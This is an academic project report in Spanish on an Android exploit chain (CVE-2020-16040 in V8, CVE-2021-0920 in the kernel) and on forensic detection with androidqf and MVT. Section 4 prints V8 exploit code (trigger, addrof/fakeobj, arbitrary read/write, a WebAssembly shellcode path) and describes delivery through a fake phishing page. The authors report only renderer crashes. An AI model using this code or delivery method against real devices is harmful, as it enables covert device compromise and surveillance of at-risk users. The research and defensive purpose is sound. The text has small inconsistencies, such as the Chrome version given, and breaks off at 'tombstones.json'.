# Pruebas de concepto (PoC) y Análisis de Cadenas de Explotación en Android: CVE-2020-16040 (V8 Type Confusion) y CVE-2021-0920 (Escalada de Privilegios en Kernel)

**Instituto Tecnológico y de Estudios Superiores de Occidente (ITESO)**  
Proyecto de Aplicación Profesional – PAP ITESO 2026  
Colaboración: SocialTIC

**Autor:** Jorge Francisco Arriaga Escamilla  
**Guadalajara, Jalisco – 2026**


## Índice

## Índice
<!-- TOC -->
<!-- /TOC -->-
- [Pruebas de concepto (PoC) y Análisis de Cadenas de Explotación en Android: CVE-2020-16040 (V8 Type Confusion) y CVE-2021-0920 (Escalada de Privilegios en Kernel)](#pruebas-de-concepto-poc-y-análisis-de-cadenas-de-explotación-en-android-cve-2020-16040-v8-type-confusion-y-cve-2021-0920-escalada-de-privilegios-en-kernel)
  - [Índice](#índice)
  - [Índice](#índice-1)
  - [1. Introducción](#1-introducción)
  - [2. Explicación](#2-explicación)
    - [2.1 ¿Qué es una cadena de explotación?](#21-qué-es-una-cadena-de-explotación)
    - [2.2 Uso en escenarios reales.](#22-uso-en-escenarios-reales)
  - [3. Reference: Referencia Técnica](#3-reference-referencia-técnica)
    - [3.1 CVE-2020-16040: Type Confusion en el Motor V8 de Chromium](#31-cve-2020-16040-type-confusion-en-el-motor-v8-de-chromium)
      - [3.1.1 Descripción del componente afectado](#311-descripción-del-componente-afectado)
      - [3.1.2 Type Confusion](#312-type-confusion)
      - [3.1.3 De type confusion a AAR/AAW y RCE](#313-de-type-confusion-a-aaraaw-y-rce)
    - [3.2 CVE-2021-0920: Escalada de Privilegios en el Kernel Android](#32-cve-2021-0920-escalada-de-privilegios-en-el-kernel-android)
      - [3.2.1 Descripción del componente afectado](#321-descripción-del-componente-afectado)
      - [3.2.2 Use-after-free y race-condition](#322-use-after-free-y-race-condition)
      - [3.2.3 Primitiva de escalada de privilegios](#323-primitiva-de-escalada-de-privilegios)
  - [4. Tutorial: Implementación del Proyecto](#4-tutorial-implementación-del-proyecto)
    - [4.1 Configuración del entorno de trabajo](#41-configuración-del-entorno-de-trabajo)
      - [4.1.1 Hardware y sistema operativo objetivo](#411-hardware-y-sistema-operativo-objetivo)
      - [4.1.2 Entorno de desarrollo y análisis](#412-entorno-de-desarrollo-y-análisis)
    - [4.2 Análisis del exploit para CVE-2020-16040](#42-análisis-del-exploit-para-cve-2020-16040)
    - [Explicación del Código](#explicación-del-código)
      - [4.2.1 Construcción de la primitiva addrof/fakeobj](#421-construcción-de-la-primitiva-addroffakeobj)
      - [4.2.2 Implementación de AAR/AAW mediante ArrayBuffer sintético](#422-implementación-de-aaraaw-mediante-arraybuffer-sintético)
      - [4.2.3 Integración de WebAssembly para ejecución de shellcode](#423-integración-de-webassembly-para-ejecución-de-shellcode)
    - [4.3 Pruebas de ejecución y resultados observados](#43-pruebas-de-ejecución-y-resultados-observados)
      - [4.3.1 Ejecución del exploit en el renderer](#431-ejecución-del-exploit-en-el-renderer)
      - [4.3.2 Ajuste de offsets y verificación](#432-ajuste-de-offsets-y-verificación)
      - [4.3.3 Resultado: ejecución en el renderer y limitaciones del sandbox](#433-resultado-ejecución-en-el-renderer-y-limitaciones-del-sandbox)
    - [4.4 Análisis de CVE-2021-0920 en contexto aislado](#44-análisis-de-cve-2021-0920-en-contexto-aislado)
    - [4.5 Timeline Attack](#45-timeline-attack)
  - [5. How-To: Análisis Forense y Hallazgos](#5-how-to-análisis-forense-y-hallazgos)
    - [5.1 AndroidQF](#51-androidqf)
      - [5.1.1  Obtención de androidqf](#511--obtención-de-androidqf)
    - [5.2 MVT](#52-mvt)
      - [5.2.1  Aplicación de MVT](#521--aplicación-de-mvt)
    - [5.3 Análisis de evidencia](#53-análisis-de-evidencia)
    - [5.3.1 Evidencia obtenida](#531-evidencia-obtenida)
  - [6. Conclusión](#6-conclusión)
  - [Referencias](#referencias)


---

## 1. Introducción

El presente documento describe el proceso práctico desarrollado en el marco del Proyecto de Aplicación Profesional (PAP) correspondiente al ciclo ITESO Primavera 2026, en colaboración con SocialTIC. La investigación se enfocó en la construcción y comprensión de una cadena de explotación dirigida a dispositivos Android, tomando como piezas fundamentales dos vulnerabilidades públicamente documentadas: CVE-2020-16040, una vulnerabilidad de confusión de tipos en el motor JavaScript V8 del navegador Chromium, y CVE-2021-0920, una vulnerabilidad de *use-after-free* en el subsistema Unix garbage collector del kernel Linux —tal como se implementa en Android—, que permite la escalada de privilegios desde el contexto del proceso comprometido hasta el nivel del sistema. El trabajo combina análisis estático y dinámico, implementación de pruebas de concepto (PoC), experimentación en dispositivo físico con Android 9 (ARM64) y análisis forense posterior mediante las herramientas Mobile Verification Toolkit (MVT) y androidqf. 

---


## 2. Explicación

### 2.1 ¿Qué es una cadena de explotación?

Una cadena de explotación (*exploit chain*) es una secuencia ordenada de vulnerabilidades que, al encadenarse, permite a un atacante alcanzar un objetivo de control que ninguna de las vulnerabilidades individuales podría lograr por sí sola la cadena de explotación, por ejemplo, comienza con la primera vulnerabilidad de la cadena, que típicamente provee acceso inicial dentro de un proceso con privilegios reducidos. Una vez dentro de este proceso, la segunda vulnerabilidad permite escapar del *sandbox* (un método para aislar procesos como mecanismo de defensa) para ganar acceso al proceso privilegiado, como el navegador o directamente al espacio de usuario del sistema operativo. Si el objetivo es el control total del dispositivo, una tercera vulnerabilidad eleva los permisos del atacante de usuario sin privilegios a superusuario (*root*), otorgándole control completo y sin reestricción sobre el sistema.


### 2.2 Uso en escenarios reales.

Las cadenas de explotación son cruciales para la seguridad digital, especialmente para periodistas y activistas en América Latina. Conocimiento sobre estas cadenas permite diseñar programas de detección y respuesta a incidentes, y generar inteligencia sobre tácticas y procedimientos para comunidades en riesgo. Un patrón común de ataque involucra un enlace disfrazado que ejecuta código malicioso, obteniendo acceso al sistema y, en casos sofisticados, instalando un agente de vigilancia persistente.

---


## 3. Reference: Referencia Técnica

### 3.1 CVE-2020-16040: Type Confusion en el Motor V8 de Chromium

#### 3.1.1 Descripción del componente afectado

V8 es el motor de JavaScript de Chrome, encargado de ejecutar el código de las páginas web. Para mejorar el rendimiento, utiliza un compilador llamado TurboFan, que transforma JavaScript en código máquina optimizado.

TurboFan asume que los tipos de los objetos permanecen constantes durante la ejecución, lo que le permite eliminar validaciones y acelerar el código. Si esta suposición deja de cumplirse, el motor debería revertir la optimización (desoptimizar).

La vulnerabilidad CVE-2020-16040 ocurre cuando este mecanismo falla: TurboFan continúa ejecutando código optimizado aun cuando el tipo real del objeto ha cambiado, generando una inconsistencia en la interpretación de la memoria.


#### 3.1.2 Type Confusion

Una confusión de tipos (type confusion) ocurre cuando un programa interpreta una región de memoria como si fuera de un tipo distinto al real.

En el contexto de V8, esto significa que un objeto puede ser tratado como si tuviera una estructura interna diferente (por ejemplo, interpretar datos como números cuando en realidad son punteros).

Esta situación rompe las garantías de seguridad del motor, ya que permite leer o escribir valores en memoria fuera de los límites esperados. En CVE-2020-16040, la confusión se produce debido a que TurboFan mantiene una suposición incorrecta sobre el tipo de un objeto después de una optimización inválida.

#### 3.1.3 De type confusion a AAR/AAW y RCE

A partir de la confusión de tipos, es posible manipular la memoria del proceso y construir primitivas de explotación.

Primero, el atacante obtiene la capacidad de interpretar datos como direcciones de memoria, lo que permite implementar funciones como addrof (obtener la dirección de un objeto) y fakeobj (crear un objeto en una dirección controlada).

Estas primitivas habilitan operaciones de lectura y escritura arbitraria en memoria (AAR/AAW), lo que significa que el atacante puede acceder y modificar cualquier región del proceso.

Finalmente, este control permite redirigir la ejecución del programa hacia código controlado por el atacante, logrando ejecución de código arbitrario (RCE) dentro del proceso del navegador.

---

### 3.2 CVE-2021-0920: Escalada de Privilegios en el Kernel Android

#### 3.2.1 Descripción del componente afectado
La vulnerabilidad CVE-2021-0920 afecta al subsistema de sockets Unix del kernel Linux, específicamente a la función unix_gc(), encargada de liberar memoria asociada a descriptores de archivo cuando ya no están en uso.

Este mecanismo forma parte de la gestión interna del kernel para mantener la integridad de los recursos del sistema. Sin embargo, errores en este proceso pueden provocar inconsistencias en la memoria, lo que abre la puerta a vulnerabilidades críticas.

#### 3.2.2 Use-after-free y race-condition
Un use-after-free (UAF) ocurre cuando un programa continúa utilizando una región de memoria que ya ha sido liberada. Si esa memoria es reutilizada, su contenido puede ser controlado por un atacante.

En CVE-2021-0920, este comportamiento se combina con una condición de carrera (race condition): múltiples hilos interactúan con estructuras de sockets al mismo tiempo, generando un escenario donde el kernel libera un objeto mientras otro hilo aún lo está utilizando.

Esta desincronización permite que el atacante controle el contenido de la memoria liberada, reemplazándolo por datos manipulados.

#### 3.2.3 Primitiva de escalada de privilegios
A partir del UAF, el atacante obtiene la capacidad de corromper estructuras internas del kernel, como descriptores de archivo o referencias a objetos.

Manipulando estas estructuras, es posible modificar credenciales del proceso o redirigir punteros hacia datos controlados, lo que permite elevar privilegios desde un usuario sin privilegios hasta nivel root.

Dentro de una cadena de explotación, esta vulnerabilidad representa el paso final: una vez que el atacante ya ejecuta código en espacio de usuario (por ejemplo, desde el navegador), este fallo en el kernel permite romper el aislamiento del sistema y obtener control total del dispositivo.


---


## 4. Tutorial: Implementación del Proyecto

Esta sección describe de forma narrativa el trabajo técnico real realizado durante el proyecto. Su propósito es documentar el proceso, las decisiones tomadas, los obstáculos encontrados y los resultados observados.

### 4.1 Configuración del entorno de trabajo

#### 4.1.1 Hardware y sistema operativo objetivo

El dispositivo objetivo utilizado en el proyecto fue un teléfono Android con procesador ARM64 ejecutando Android 9 (Pie, API level 28). La elección de Android 9 responde a dos criterios: es la versión en la que el navegador Chrome 86.0.4240.75 —la versión afectada por CVE-2020-16040— fue ampliamente utilizado, y es una versión sin parche para CVE-2021-0920, lo que la convierte en el contexto más realista para estudiar la cadena completa. El dispositivo contaba con la depuración USB (ADB) habilitada y *root* desactivado por defecto, replicando las condiciones de un dispositivo de usuario regular sin modificaciones.

| Parámetro | Valor |
|---|---|
| Sistema Operativo | Android 9.0 (Pie) –  |
| Arquitectura | ARM64 (aarch64) |
| Navegador objetivo | Chrome 72.0.3626.121 |
| Nivel de parche de seguridad | Anterior a noviembre 2020 |

#### 4.1.2 Entorno de desarrollo y análisis

El trabajo de desarrollo, análisis y depuración se realizó desde un *host* con MacOS. Las herramientas principales instaladas en el *host* fueron: Android Debug Bridge (ADB) para comunicación con el dispositivo, un servidor HTTP local (Python 3 `http.server`) para la entrega del *exploit*, el depurador Chrome DevTools Protocol (CDP) para inspección del estado del *renderer*, y las herramientas de análisis forense MVT y androidqf para la fase de análisis *post-explotación*.

### 4.2 Análisis del exploit para CVE-2020-16040

### Explicación del Código

#### 4.2.1 Construcción de la primitiva addrof/fakeobj
El exploit comienza provocando una confusión de tipos en V8 mediante la función foo(). Esta función fuerza a TurboFan a generar una optimización incorrecta sobre arreglos, permitiendo acceder a memoria fuera de los límites esperados.

```javascript
function foo(a) {
  var y = 0x7fffffff;
  if (a == NaN) y = NaN;
  if (a) y = -1;

  let z = y + 1;
  z >>= 31;
  z = 0x80000000 - Math.sign(z|1);

  if(a) z = 0;

  var arr = new Array(0-Math.sign(z));
  arr.shift();

  var cor = [1.1, 1.2, 1.3];

  return [arr, cor];
}
```

Para la construcción de las dos primitivas fundamentales: `addrof` —que permite obtener la dirección numérica de cualquier objeto JavaScript en el *heap* de V8— y `fakeobj` —que permite crear una referencia JavaScript a una dirección de memoria arbitraria, haciendo que V8 la trate como un objeto legítimo—. Estas primitivas son el punto de articulación entre la corrupción inicial de tipos y el control real de la memoria del proceso.

La técnica utilizada fue la manipulación del campo «map» de un objeto `JSArray` mediante la confusión de tipos descrita en la sección de referencia. Al crear un *array* de tipo `Float64Array` y un objeto ordinario adyacente en el *heap*, y luego provocar la confusión de tipos bajo las condiciones requeridas para CVE-2020-16040, fue posible leer el campo «map» del objeto adyacente como un valor *float* de 64 bits. La representación numérica de ese *float* contiene los bits que, reinterpretados como un puntero, corresponden a la dirección del mapa —y por extensión, del objeto— en el *heap* de V8. Esta es la primitiva `addrof`.

```javascript
// Fragmento simplificado – primitiva addrof
function addrof(target_obj) {
  // Colocar objeto objetivo en posición controlada del heap
  holder[0] = target_obj;
  // Activar type confusion: leer campo de puntero como float64
  return f2i(confused_array[OBJ_MAP_OFFSET]);
}
```

La primitiva `fakeobj` es la inversa: permite crear un objeto JavaScript cuya dirección en memoria el atacante controla, escribiendo un valor *float* en el campo del *heap* de V8 que V8 interpretará como un puntero a objeto.

```javascript
// Fragmento simplificado – primitiva fakeobj
function fakeobj(addr) {
  // Escribir dirección como float64 en el offset de puntero de objeto
  confused_array[OBJ_MAP_OFFSET] = i2f(addr);
  // Leer de vuelta el campo como objeto – V8 lo desreferencia como JSObject
  return holder[0];
}
```


#### 4.2.2 Implementación de AAR/AAW mediante ArrayBuffer sintético
El exploit utiliza un ArrayBuffer para construir capacidades de lectura y escritura arbitraria en memoria.
```javascript
let buf2 = new ArrayBuffer(0x150);
```
En V8, los datos reales del ArrayBuffer son almacenados en una región apuntada por el campo backing_store. El exploit sobrescribe este puntero para redirigir las operaciones del buffer hacia direcciones arbitrarias.

La lectura arbitraria se implementa mediante:
```javascript
function arbread(addr) {
    if (addr % 2n == 0) addr += 1n;

    arr2[1] = itof((2n << 32n) + addr - 8n);

    return (fake[0]);
}
```
La escritura arbitraria se implementa mediante:
```javascript
function arbwrite(addr, val) {
    if (addr % 2n == 0) addr += 1n;

    arr2[1] = itof((2n << 32n) + addr - 8n);

    fake[0] = itof(BigInt(val));
}
```
Estas funciones permiten acceder directamente a memoria del proceso del navegador, rompiendo el aislamiento normal del renderer.

#### 4.2.3 Integración de WebAssembly para ejecución de shellcode
Una vez establecidas las primitivas AAR/AAW, el objetivo fue obtener ejecución de código arbitrario en el *renderer*. La técnica se basa en el hecho de que el *runtime* de WebAssembly en V8 requiere una región de memoria con permisos simultáneos de lectura, escritura y ejecución (RWX) para almacenar el código nativo compilado de los módulos Wasm. El proceso consiste en: compilar un módulo WebAssembly mínimo y válido para que V8 asigne la región RWX; usar AAR para leer el campo `jump_table_start` del objeto `wasm::NativeModule`, que contiene la dirección de esa región; usar AAW para escribir el *shellcode* en la región RWX; y finalmente llamar a la función del módulo Wasm para redirigir la ejecución al *shellcode*.

```javascript
// Inicialización del módulo WebAssembly
const wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d,  // magic: \0asm
  0x01, 0x00, 0x00, 0x00,  // version: 1
  0x01, 0x04, 0x01, 0x60,  // type section: func () -> ()
  0x00, 0x00, 0x03, 0x02,  // function section
  0x01, 0x00, 0x07, 0x08,  // export section
  0x01, 0x04, 0x6d, 0x61,  // export name: 'main'
  0x69, 0x6e, 0x00, 0x00,
  0x0a, 0x04, 0x01, 0x02,  // code section
  0x00, 0x0b               // body: empty function
]);
const wasm_mod  = new WebAssembly.Module(wasm_code);
const wasm_inst = new WebAssembly.Instance(wasm_mod);
const wasm_func = wasm_inst.exports.main;
```
Una vez localizada la región RWX, el shellcode ARM64 es copiado mediante:

```javascript
copy_shellcode(target_addr, shellcode);
```
Finalmente, la ejecución es activada invocando la función Wasm:
```javascript
f();
```
El exploit verifica el éxito comprobando la modificación de un valor específico en memoria:
```javascript
if(flag_view[0] === 0xDEADBEEFCAFEBABEn) {
    log("[+] ¡RCE CONFIRMADO!", "success");
}
```
Esto confirmaría la ejecución de código arbitrario dentro del proceso del navegador.


### 4.3 Pruebas de ejecución y resultados observados

#### 4.3.1 Ejecución del exploit en el renderer

El *exploit* fue entregado al dispositivo objetivo a través de un servidor HTTP local, la página cargada simula hacia una plataforma en la nube para Gestión Empresarial, esto se realizó con el objetivo de replicar como sería un recurso de phishing para lograr acceso inicial para el dispositivo de una víctima.

<p align="center">
  <img src="images/pagina.png" width="700">
</p>

<p align="center">
  Figura 1. Página de phishing.
</p>


Dentro del dispositivo Android preparado, simulando ser la víctima, se accedió desde el navegador Chrome con versión 72.0.3626.121 a la página HTML de entrega contenía el *exploit* JavaScript completo e inicializaba automáticamente la secuencia de explotación al ser cargada. 
```html
<script src="test.js"></script>
```

La ejecución fue monitoreada desde un *host* mediante `adb logcat | grep "chrome"` para capturar mensajes del navegador, 

Después de algunas iteraciones, la ejecución produjo *crashes* del proceso del *renderer*, manifestados como señales `SIGSEGV` (violación de segmento). 
Los registros mostraban errores SEGV_MAPERR con fault address 0x0, indicando intentos de acceso a punteros nulos (null pointer dereference).

Estos fallos evidenciaban que el exploit alcanzaba las fases de resolución de estructuras internas de V8 y WebAssembly, pero utilizando offsets incompatibles con la versión específica del binario de Chrome presente en el dispositivo. Como resultado, algunos punteros críticos —como referencias a NativeModule o regiones ejecutables RWX— eran resueltos incorrectamente, produciendo accesos inválidos a memoria.

<p align="center">
  <img src="images/crash.png" width="700">
</p>

<p align="center">
  Figura 2. Señales de SIGSEGV y SEGV_MAPERR.
</p>


#### 4.3.2 Ajuste de offsets y verificación

Después de las primeras ejecuciones del exploit, el comportamiento observado no correspondía a una ejecución estable de código arbitrario, sino a crashes del proceso renderer de Chrome. Esto hizo evidente que los offsets utilizados por el exploit no coincidían correctamente con el layout interno de la versión específica de Chrome instalada en el dispositivo objetivo.

El exploit dependía de navegar estructuras internas de V8 y WebAssembly utilizando desplazamientos de memoria específicos. Entre estas estructuras se encontraban referencias asociadas al objeto NativeModule, tablas de salto (jump tables), punteros internos de funciones Wasm y direcciones de memoria potencialmente ejecutables (RWX). Si alguno de estos offsets era incorrecto, el exploit terminaba resolviendo punteros inválidos o nulos.

Los errores observados en logcat mostraban consistentemente fallos SIGSEGV con SEGV_MAPERR y accesos a la dirección 0x0, indicando una desreferenciación de punteros nulos (null pointer dereference).

```Text
Fatal signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x0
```
Este comportamiento sugería que el exploit lograba alcanzar fases avanzadas de manipulación de memoria dentro del renderer, pero fallaba durante la resolución de estructuras internas necesarias para continuar la cadena de explotación. En lugar de obtener una dirección válida hacia regiones ejecutables o estructuras Wasm, algunos punteros terminaban apuntando a memoria no mapeada.

A partir de estos resultados, se realizó un proceso iterativo de ajuste de offsets. Para cada ejecución se modificaban valores relacionados con estructuras internas de V8 y posteriormente se validaba el comportamiento del proceso mediante adb logcat, observando si el crash ocurría en fases diferentes del exploit o si cambiaba el patrón del fallo.

Durante este análisis también se confirmó que los procesos afectados correspondían a procesos aislados (sandboxed processes) del navegador Chrome, específicamente instancias de SandboxedProcessService.

```Text
Scheduling restart of crashed service
com.android.chrome/org.chromium.content.app.SandboxedProcessService
```
Esto indicaba que el exploit efectivamente interactuaba con el proceso renderer del navegador y alcanzaba un nivel significativo de manipulación interna de memoria, aunque sin lograr una ejecución estable de código arbitrario.


#### 4.3.3 Resultado: ejecución en el renderer y limitaciones del sandbox
El resultado final de las pruebas fue la generación consistente de crashes dentro del proceso renderer de Chrome al ejecutar el exploit en el dispositivo Android objetivo. Los registros obtenidos mediante logcat mostraban reinicios automáticos de procesos SandboxedProcessService acompañados de errores SIGSEGV, lo que confirmaba accesos inválidos a memoria dentro del contexto del navegador.

Aunque estos resultados no constituyen evidencia suficiente para afirmar una ejecución exitosa de shellcode o una ejecución completa de código arbitrario (RCE), sí indican que el exploit logró alterar el comportamiento normal del renderer y alcanzar etapas avanzadas de corrupción de memoria dentro de V8.

La principal limitación encontrada fue la dependencia del exploit respecto a offsets específicos de la implementación interna de V8 y WebAssembly para esa versión particular de Chrome. Diferencias pequeñas entre compilaciones, versiones del navegador o estructuras internas del motor pueden provocar que punteros críticos sean resueltos incorrectamente, generando referencias nulas o accesos inválidos en lugar de control estable del flujo de ejecución.

### 4.4 Análisis de CVE-2021-0920 en contexto aislado
La vulnerabilidad CVE-2021-0920, segundo eslabón de la cadena de explotación del proyecto, buscaba elevar privilegios desde espacio de usuario al kernel de Android.  Según el análisis técnico de Google Project Zero, la vulnerabilidad radicaba en la función unix_gc() del subsistema de sockets Unix del kernel Linux.  Este componente libera referencias a descriptores de archivo y limpia objetos asociados a sockets inactivos.  Bajo ciertas condiciones de concurrencia, el kernel podía liberar una estructura mientras otro hilo mantenía una referencia activa, generando una condición de use-after-free (UAF).

Encadenada con la vulnerabilidad de Chrome, el objetivo era usar la ejecución obtenida en el renderer para interactuar con el kernel mediante llamadas al sistema relacionadas con sockets Unix.  Mediante múltiples hilos y operaciones concurrentes, el atacante intentaría provocar la condición de carrera necesaria para reutilizar memoria liberada y reemplazarla por datos controlados.

Sin embargo, durante el desarrollo del proyecto se identificó una limitación clave: el proceso renderer de Chrome opera en un entorno altamente restringido con sandboxing y filtros seccomp-bpf. Estas restricciones limitan el acceso a varias syscalls necesarias para interactuar directamente con el subsistema vulnerable del kernel.


### 4.5 Timeline Attack
 

---

## 5. How-To: Análisis Forense y Hallazgos

Esta sección tiene como propósito describir la interpretación de la evidencia recopilada desde una perspectiva forense. A partir de los artefactos obtenidos durante las pruebas se busca correlacionar los eventos registrados por Android con las distintas etapas del exploit, con el fin de comprender el alcance real de las pruebas realizadas y las limitaciones observadas durante el proceso de explotación.

### 5.1 AndroidQF

#### 5.1.1  Obtención de androidqf
Primero se realizó la extracción forense del dispositivo, para ello se utilizó la herramienta AndroidQF obtenida del siguiente repositorio:
```text
https://github.com/mvt-project/androidqf/
```
Se utilizó el siguiente comando para la extracción extraccion, se utilizó la flag "-v" para obtener más información al momento de la extracción.

```bash
path/to/androidqf_macos_universal_1.8.1-6-gdcfc1e9 -o /path/to/save/extraction -v 
```

Una vez ejecutado obtenemos lo siguiente en el directorio donde se guardó la información extraida:
<p align="center">
  <img src="images/clean.png" width="700">
</p>

<p align="center">
  Figura 3. Información extraida con AndroidQF.
</p>

### 5.2 MVT

#### 5.2.1  Aplicación de MVT
Luego, con la extracción obtenida se le aplica un comando para parsear o hacer de más fácil lectura los archivos obtenidos, esto se logra con la herramienta MVT, el comando es el siguiente

```bash
mvt-android check-androidqf path/saved/androidqf/extraction -o path/to/save/mvt/extraction
```
Y como se observa en la siguiente imagen se generan los siguientes archivos:
<p align="center">
  <img src="images/clean2.png" width="700">
</p>

<p align="center">
  Figura 4. Información parseada con MVT.
</p>

Previo a lo anterior se identificó que los tombstones generados por el dispositivo ZTE Blade V10 no contenían algunos campos esperados por el modelo interno de MVT, específicamente los campos `timestamp` y `uid`. Debido a esto, MVT generaba errores de validación utilizando al intentar construir el objeto `TombstoneCrashResult`.

Todas las modificaciones se realizaron en el archivo:

```text
src/mvt/android/artifacts/tombstone_crashes.py
```

Dentro de la clase `TombstoneCrashResult`, ajustando los siguientes campos para permitir valores opcionales:

- `timestamp`
- `uid`

```python
class TombstoneCrashResult(pydantic.BaseModel):
    """
    MVT Result model for a tombstone crash result.

    Needed for validation and serialization, and consistency between text and protobuf tombstones.
    """
   ...
    timestamp: Optional[str]  # We store the timestamp as a string to avoid timezone issues
    uid: Optional[int]
   ...

```

Posteriormente se identificó que el problema no solo se encontraba en el modelo de validación, sino también en el parser encargado de interpretar los tombstones en texto plano.

Se trabajó dentro de la función:

```python
def parse(...)
```

En esta función se agregó lógica para completar manualmente los campos faltantes dentro de `tombstone_dict` antes de ejecutar:

TombstoneCrashResult.model_validate(tombstone_dict)

Los campos agregados o completados fueron:

- `timestamp`
- `uid`
- `signal_info`
- `process_name`
- `pid`
- `tid`
- `build_fingerprint`
- `revision`

Para el campo `timestamp`, debido a que el tombstone del dispositivo no incluía una línea `Timestamp:`, se utilizó como fallback el valor contenido en:

`file_timestamp`

Para el campo `uid`, al no existir dentro del tombstone original, se agregó un valor por defecto de:
```text
-1
```

También se agregó validación para garantizar que `signal_info` siempre existiera antes de la validación del modelo, incluyendo los campos:

- `code`
- `code_name`
- `name`
- `number`


```python
def parse(
   ...
   # timestamp fallback
        if "timestamp" not in tombstone_dict:
            tombstone_dict["timestamp"] = tombstone_dict["file_timestamp"]
        # uid fallback
        if "uid" not in tombstone_dict:
            tombstone_dict["uid"] = -1
        # process_name fallback
        if "process_name" not in tombstone_dict:
            tombstone_dict["process_name"] = "unknown"
        # signal_info fallback
        if "signal_info" not in tombstone_dict:
            tombstone_dict["signal_info"] = {
                "code": -1,
                "code_name": "UNKNOWN",
                "name": "UNKNOWN",
                "number": -1,
            }
        # build_fingerprint fallback
        if "build_fingerprint" not in tombstone_dict:
            tombstone_dict["build_fingerprint"] = "unknown"
        # revision fallback
        if "revision" not in tombstone_dict:
            tombstone_dict["revision"] = "0"
        # pid/tid fallback
        if "pid" not in tombstone_dict:
            tombstone_dict["pid"] = -1
        if "tid" not in tombstone_dict:
            tombstone_dict["tid"] = -1
   ...
```

Posteriormente se realizaron modificaciones en la función:

```python
def _load_pid_line(...)
```

El objetivo fue corregir la extracción del nombre del proceso (`process_name`) desde líneas con el formato:

pid: 6944, tid: 6944, name: .android.chrome  >>> com.android.chrome <<<

Originalmente el parser no interpretaba correctamente este formato específico generado por el dispositivo ZTE. La modificación permitió extraer correctamente:
```text
com.android.chrome
```

como valor de `process_name`.

```python
   # Extraer nombre real del proceso (>>> com.android.chrome <<<)
   if len(parts) > 1:
         tombstone["process_name"] = parts[1].strip().rstrip(" <")
```

Adicionalmente se modificó la función:

```python
def _load_key_value_line(...)
```

para evitar que se generaran excepciones (`ValueError`) cuando alguna línea del tombstone no coincidiera exactamente con el formato esperado por MVT. En lugar de detener completamente el parsing, el parser continuó procesando el resto de las líneas válidas del archivo.

Finalmente, tras las modificaciones realizadas, se logró parsear correctamente los tombstones generados por el dispositivo.

<p align="center">
  <img src="images/mvt.png" width="700">
</p>

<p align="center">
  Figura 5. Parseo con MVT.
</p>


### 5.3 Análisis de evidencia

En este apartado se realizará un análisis desde una perspectiva forense, omitiendo el contexto en el que se obtuvieron las pruebas. El objetivo es demostrar cómo se interpreta la evidencia recopilada y cómo, a partir de ella, es posible identificar indicios de que el dispositivo presentó un comportamiento anómalo o pudo haber sido comprometido. 


### 5.3.1 Evidencia obtenida

Se realizó un análisis exhaustivo de cada uno de los archivos extraidos mediante MVT dando como resultado los siguientes hallazgos:

Dentro del archivo:
```text
aqf_settings.json
```

Se detectó evidencia de modificación de valores en los siguientes campos:

- `package_verifier_user_consent = -1  → Google Play Protect desactivado por el usuario`
- `package_verifier_state = -1  → Verificación de paquetes APK desactivada`
- `install_non_market_apps = 1  → Instalación desde fuentes desconocidas habilitada`
- `development_settings_enabled = 1  → Opciones de desarrollador activas`
- `adb_enabled = 1  → ADB habilitado`

Aunque se requiere más evidencia para confirmarlo, la modificación de estos valores puede interpretarse como un posible indicio de manipulación orientada a evadir comportamientos de seguridad esperados en el dispositivo.
Por ejemplo, un valor de -1 puede indicar que el usuario rechazó o deshabilitó una actividad específica. En este caso, los registros apuntan a la verificación de paquetes APK y a Google Play Protect desactivado. Esto permite plantear la hipótesis de que, una vez comprometido el dispositivo, el atacante pudo haber desactivado estas validaciones para facilitar la instalación de un APK malicioso y ejecutar actividades no autorizadas.


El siguiente indicio de que el dispositivo pudo haber sido comprometido se encuentran en los siguientes archivos

```text
aqf_get_prop.json / mounts.json
```

Dentro de  `aqf_get_prop.json` se encuentran los siguientes campos:

- `init.svc.adbd = running` → El daemon ADB está corriendo
- `sys.usb.state = charging,adb` → El estado USB combina carga y ADB
- `persist.sys.usb.config = adb` → La configuración ADB es persistente entre reinicios
- `sys.usb.ffs.ready = 1` → El subsistema FunctionFS está listo para conexiones

Con estos valores, es posible concluir que el dispositivo presenta indicios de manipulación. Esto se debe a que ADB no viene habilitado por defecto en un dispositivo Android y, además, no debería mantenerse activo de forma persistente. Si ADB permanece habilitado incluso después de reiniciar el dispositivo, significa que este podría seguir siendo administrado mediante una conexión ADB autorizada.

Bajo estas condiciones, una persona con acceso físico temporal al dispositivo mediante cable USB podría ejecutar comandos arbitrarios, extraer información, instalar APKs o modificar configuraciones sin que el usuario lo perciba fácilmente.

Adicionalmente, el archivo `mounts.json` confirma a nivel de sistema de archivos que el endpoint USB de ADB se encuentra montado como un sistema de archivos de tipo functionfs en la ruta `/dev/usb-ffs/adb`, con permisos de lectura y escritura.

En un escenario de ataque, esto solo requeriría que el atacante hubiera autorizado previamente su clave RSA en el dispositivo. Una vez que dicha clave queda registrada en `/data/misc/adb/adb_keys`, el dispositivo puede aceptar conexiones desde ese equipo autorizado sin volver a mostrar un diálogo de confirmación al usuario.


Como tercer indicio, dentro del archivo:
```text
aqf_get_prop.json → ro.build.version.security_patch
```

Se pudo detectar que el dispositivo cuenta con un parche de 2021-04-05, acumulando más de cinco años de vulnerabilidades sin corregir sobre kernel Linux, framework Android, Bluetooth, F2FS y componentes MediaTek. El caso más representativo es CVE-2021-0920 — use-after-free en el garbage collector de sockets Unix del kernel — para el cual el vendor de vigilancia Wintego desarrolló un exploit activo que, combinado con exploits de Chrome, permitía rootear dispositivos Android de forma remota, y que el propio boletín de Android de noviembre de 2021 confirmó como bajo explotación limitada y dirigida en la naturaleza — parche que este dispositivo nunca recibió. A ese CVE se suman, entre otros: CVE-2021-1048 (use-after-free en eventpoll, escalación de privilegios sin interacción del usuario), CVE-2022-38181 (ARM Mali GPU, escalación de privilegios sin interacción), CVE-2023-0266 (ALSA kernel, use-after-free con escalación a ring0), CVE-2023-26083 (Mali GPU, fuga de punteros de kernel que anula KASLR) y CVE-2023-21250 (Android System, RCE remoto sin interacción del usuario). 

AL encontrarse en este estado, el dispositivo es susceptible a que un atacante pueda encadenar alguna vulnerabilidad para poder tener acceso con privilegios de `root`.

Por último se encontró dentro del archivo: 
```text
tombstones.json
```

